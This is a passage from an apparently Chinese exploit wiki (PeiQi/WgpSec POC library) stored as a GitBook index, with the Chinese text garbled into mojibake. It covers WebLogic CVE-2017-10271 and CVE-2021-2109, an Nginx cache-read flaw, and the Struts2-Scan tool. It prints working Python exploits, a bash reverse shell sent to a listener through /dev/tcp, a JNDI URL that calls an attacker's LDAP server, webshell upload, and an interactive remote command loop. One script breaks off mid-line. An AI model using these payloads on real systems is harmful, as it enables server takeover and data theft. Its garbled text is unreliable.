[23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability! WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271.html","title":"Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 æ¼æ´æè¿° Weblogicçš„WLS Securityç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° å¯¹ http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType è¿›è¡Œè®¿é—®ï¼Œå­˜åœ¨è¿™ä¸ªurlåˆ™å¯èƒ½å­˜åœ¨æ¼æ´ å…¶ä»–å¯åˆ©ç”¨URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 ä½¿ç”¨POSTæ–¹æ³•ä¸Šä¼ ä»¥ä¸‹æ•°æ®åå¼¹ä¸€ä¸ªshell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 ä½¿ç”¨Curlåå¼¹shell (å°†ä¸Šé¢çš„xmlæ•°æ®ä¿å­˜ä¸ºpoc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" ä¹Ÿå¯ä»¥é€šè¿‡æ¼æ´å†™å…¥webshellæ–‡ä»¶ servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> è®¿é—® http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp å³å¯å¾—åˆ°å†™å…¥çš„æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC åˆ©ç”¨ weblogic-scanå¿«é€Ÿæ£€æµ‹ [!NOTE] åå¼¹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109.html","title":"Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109","keywords":"","body":"Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 æ¼æ´æè¿° 2021å¹´1æœˆ20æ—¥ï¼Œç»¿ç›Ÿç§‘æŠ€ç›‘æµ‹å‘ç°Oracleå®˜æ–¹å‘å¸ƒäº†2021å¹´1æœˆå…³é”®è¡¥ä¸æ›´æ–°å…¬å‘ŠCPUï¼ˆCritical Patch Updateï¼‰ï¼Œå…±ä¿®å¤äº†329ä¸ªä¸åŒç¨‹åº¦çš„æ¼æ´ï¼Œå…¶ä¸­åŒ…æ‹¬7ä¸ªå½±å“WebLogicçš„ä¸¥é‡æ¼æ´ï¼ˆCVE-2021-1994ã€CVE-2021-2047ã€CVE-2021-2064ã€CVE-2021-2108ã€CVE-2021-2075ã€CVE-2019-17195ã€CVE-2020-14756ï¼‰ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯é€šè¿‡æ­¤æ¬¡çš„æ¼æ´å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚CVSSè¯„åˆ†å‡ä¸º9.8ï¼Œåˆ©ç”¨å¤æ‚åº¦ä½ã€‚å»ºè®®ç”¨æˆ·å°½å¿«é‡‡å–æªæ–½ï¼Œå¯¹ä¸Šè¿°æ¼æ´è¿›è¡Œé˜²æŠ¤ã€‚ æ¼æ´å½±å“ [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° è®¿é—®ä¸€ä¸‹URL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal å¦‚æœæœ‰æ­¤é¡µé¢æœªæˆæƒå¯è®¿é—®ï¼Œä¸”åœ¨å½±å“èŒƒå›´å†…åˆ™å¯èƒ½å‡ºç°æ¼æ´ ä¸‹è½½æ¼æ´æ”»å‡»éœ€è¦çš„ LDAPå¯åŠ¨è„šæœ¬ ä¸‹è½½é“¾æ¥ ä¸‹è½½åˆ°æœåŠ¡å™¨ä¸Šå¯åŠ¨ java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (æœåŠ¡å™¨åœ°å€) [!NOTE] éƒ¨åˆ†æœåŠ¡å™¨æ³¨æ„æ”¾è¡Œç«¯å£ ç„¶åé…åˆ WeblogicæœªæˆæƒèŒƒå›´ å‘½ä»¤æ‰§è¡Œ /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] æ³¨æ„ ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho è¿™é‡Œ LDAPæœåŠ¡å™¨åœ°å€ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦å·ä¸º ; ç™»å½•åå°å¯ä½¿ç”¨æ­¤POCï¼Œæœªæˆæƒçš„è¯ç”¨ä¸Šé¢çš„ /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) æ¼æ´åˆ©ç”¨POC [!NOTE] æ³¨æ„å‚æ•°æ ¼å¼ Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 ä¸­çš„åˆ†å· å¦‚æœä½¿ç”¨å…¶ä»–çš„åˆ©ç”¨LdapæœåŠ¡è¯·è‡ªè¡Œæ›´æ”¹ POCå…³é”®å­— æ­¤POCä»…ä»…æ£€éªŒæœ‰æœªæˆæƒçš„æƒ…å†µ import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weblogic å¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] å‘½ä»¤æ‰§è¡Œå¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥å‚æ•°å’ŒLdapæœåŠ¡æ˜¯å¦æ­£ç¡® \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥å‚æ•°å’ŒLdapæœåŠ¡æ˜¯å¦æ­£ç¡® \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap >>> \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) Goby & POC [!NOTE] Weblogic_LDAP RCE_CVE-2021-2109 æ³¨æ„æ¼æ´éªŒè¯ Ldapå‚æ•°åŒæ ·è·Ÿä¸Šé¢çš„POCä¸€æ ·æ ¼å¼ï¼Œæ³¨æ„åˆ†å· WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/","title":"Nginx","keywords":"","body":"Nginx Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529.html","title":"Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529","keywords":"","body":"Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 æ¼æ´æè¿° Nginxåœ¨åå‘ä»£ç†ç«™ç‚¹çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå°†ä¸€äº›æ–‡ä»¶è¿›è¡Œç¼“å­˜ï¼Œç‰¹åˆ«æ˜¯é™æ€æ–‡ä»¶ã€‚ç¼“å­˜çš„éƒ¨åˆ†å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªç¼“å­˜æ–‡ä»¶åŒ…æ‹¬â€œæ–‡ä»¶å¤´â€+â€œHTTPè¿”å›åŒ…å¤´â€+â€œHTTPè¿”å›åŒ…ä½“â€ã€‚å¦‚æœäºŒæ¬¡è¯·æ±‚å‘½ä¸­äº†è¯¥ç¼“å­˜æ–‡ä»¶ï¼Œåˆ™Nginxä¼šç›´æ¥å°†è¯¥æ–‡ä»¶ä¸­çš„â€œHTTPè¿”å›åŒ…ä½“â€è¿”å›ç»™ç”¨æˆ·ã€‚ å¦‚æœæˆ‘çš„è¯·æ±‚ä¸­åŒ…å«Rangeå¤´ï¼ŒNginxå°†ä¼šæ ¹æ®æˆ‘æŒ‡å®šçš„startå’Œendä½ç½®ï¼Œè¿”å›æŒ‡å®šé•¿åº¦çš„å†…å®¹ã€‚è€Œå¦‚æœæˆ‘æ„é€ äº†ä¸¤ä¸ªè´Ÿçš„ä½ç½®ï¼Œå¦‚(-600, -9223372036854774591)ï¼Œå°†å¯èƒ½è¯»å–åˆ°è´Ÿä½ç½®çš„æ•°æ®ã€‚å¦‚æœè¿™æ¬¡è¯·æ±‚åˆå‘½ä¸­äº†ç¼“å­˜æ–‡ä»¶ï¼Œåˆ™å¯èƒ½å°±å¯ä»¥è¯»å–åˆ°ç¼“å­˜æ–‡ä»¶ä¸­ä½äºâ€œHTTPè¿”å›åŒ…ä½“â€å‰çš„â€œæ–‡ä»¶å¤´â€ã€â€œHTTPè¿”å›åŒ…å¤´â€ç­‰å†…å®¹ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Nginx version 0.5.6 - 1.13.2 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080 æ­£å¸¸å³å¯ æ¼æ´å¤ç° ä½¿ç”¨ç›®å½•ä¸‹çš„POCè¿›è¡ŒéªŒè¯ python poc.py http://xxx.xxx.xxx.xxx:8080/ æ¼æ´åˆ©ç”¨POC #!/usr/bin/env python import sys import requests if len(sys.argv) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/","title":"Apache","keywords":"","body":"Apache Apache Cocoon Apache Flink Apache HTTPd Apache Kylin Apache Mod_jk Apache Shiro Apache Solr Apache Struts2 Apache Tomcat Apache ActiveMQ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/","title":"Apache Struts2","keywords":"","body":"Apache Struts2 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· Exphub Apache Struts2 Struts2-Scan WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Struts2-Scan.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Struts2-Scan.html","title":"æ‰«æå·¥å…· Struts2-Scan","keywords":"","body":"Struts2-Scan æ¼æ´éªŒè¯ å·¥å…·åœ°å€ Struts2-Scan å·¥å…·æè¿° Struts2æ¼æ´åˆ©ç”¨æ‰«æå·¥å…·ï¼ŒåŸºäºäº’è”ç½‘ä¸Šå·²ç»å…¬å¼€çš„Structs2é«˜å±æ¼æ´expçš„æ‰«æåˆ©ç”¨å·¥å…·ï¼Œç›®å‰æ”¯æŒçš„æ¼æ´å¦‚ä¸‹: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 æ”¯æŒå•ä¸ªURLæ¼æ´æ£€æµ‹å’Œæ‰¹é‡URLæ£€æµ‹ï¼Œè‡³æ­¤æŒ‡å®šæ¼æ´åˆ©ç”¨ï¼Œå¯è·å–WEBè·¯å¾„ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shellå’Œä¸Šä¼ æ–‡ä»¶ï¼Œæ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ¼æ´å‡æ”¯æŒä¸Šè¿°åŠŸèƒ½ï¼Œåªæœ‰éƒ¨åˆ†åŠŸèƒ½æ”¯æŒ è¿è¡Œç¯å¢ƒ Python3.6.XåŠå…¶ä»¥ä¸Šç‰ˆæœ¬ ç¬¬ä¸‰æ–¹åº“: click, requests, bs4 æµ‹è¯•ç¯å¢ƒ: Ubuntu 16.04 æ¼æ´ç¯å¢ƒå·²ä¸Šä¼ ï¼Œå‚è€ƒåœ°å€ï¼š https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 å·¥å…·å‚æ•° Usage: Struts2Scan.py [OPTIONS] Struts2æ‰¹é‡æ‰«æåˆ©ç”¨å·¥å…· Options: -i, --info æ¼æ´ä¿¡æ¯ä»‹ç» -v, --version æ˜¾ç¤ºå·¥å…·ç‰ˆæœ¬ -u, --url TEXT URLåœ°å€ -n, --name TEXT æŒ‡å®šæ¼æ´åç§°, æ¼æ´åç§°è¯¦è§info -f, --file TEXT æ‰¹é‡æ‰«æURLæ–‡ä»¶, ä¸€è¡Œä¸€ä¸ªURL -d, --data TEXT POSTå‚æ•°, éœ€è¦ä½¿ç”¨çš„payloadä½¿ç”¨{exp}å¡«å……, å¦‚: name=test&passwd={exp} -c, --encode TEXT é¡µé¢ç¼–ç , é»˜è®¤UTF-8ç¼–ç  -p, --proxy TEXT HTTPä»£ç†. æ ¼å¼ä¸ºhttp://ip:port -t, --timeout TEXT HTTPè¶…æ—¶æ—¶é—´, é»˜è®¤10s -w, --workers TEXT æ‰¹é‡æ‰«æè¿›ç¨‹æ•°, é»˜è®¤ä¸º10ä¸ªè¿›ç¨‹ --header TEXT HTTPè¯·æ±‚å¤´, æ ¼å¼ä¸º: key1=value1&key2=value2 -e, --exec è¿›å…¥å‘½ä»¤æ‰§è¡Œshell --webpath è·å–WEBè·¯å¾„ -r, --reverse TEXT åå¼¹shellåœ°å€, æ ¼å¼ä¸ºip:port --upfile TEXT éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å’Œåç§° --uppath TEXT ä¸Šä¼ çš„ç›®å½•å’Œåç§°, å¦‚: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet å…³é—­æ‰“å°ä¸å­˜åœ¨æ¼æ´çš„è¾“å‡ºï¼Œåªä¿ç•™å­˜åœ¨æ¼æ´çš„è¾“å‡º -h, --help Show this message and exit. ä½¿ç”¨ä¾‹å­ æŸ¥çœ‹æ¼æ´è¯¦ç»†ä¿¡æ¯: $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ”¯æŒå¦‚ä¸‹Struts2æ¼æ´: [+] S2-001:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.8; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-003:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.11.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ [+] S2-005:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.1.8.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ [+] S2-007:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.2.3; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-008:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-009:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.1.1; GETè¯·æ±‚å‘é€æ•°æ®,URLåé¢éœ€è¦è¯·æ±‚å‚æ•°å; é»˜è®¤ä¸º: key; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-012:å½±å“ç‰ˆæœ¬Struts Showcase App 2.0.0-2.3.13; GETè¯·æ±‚å‘é€æ•°æ®,å‚æ•°ç›´æ¥æ·»åŠ åˆ°URLåé¢; é»˜è®¤ä¸º:name; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-013/S2-014:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-015:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-016:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-019:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-029:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.24.1(é™¤äº†2.3.20.3); POSTè¯·æ±‚å‘é€æ•°æ®,éœ€è¦å‚æ•°; é»˜è®¤å‚æ•°:message; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-032:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-033:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-037:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-045:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-046:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-048:å½±å“ç‰ˆæœ¬Struts 2.3.x with Struts 1 plugin and Struts 1 action; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-053:å½±å“ç‰ˆæœ¬Struts 2.0.1-2.3.33,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®; 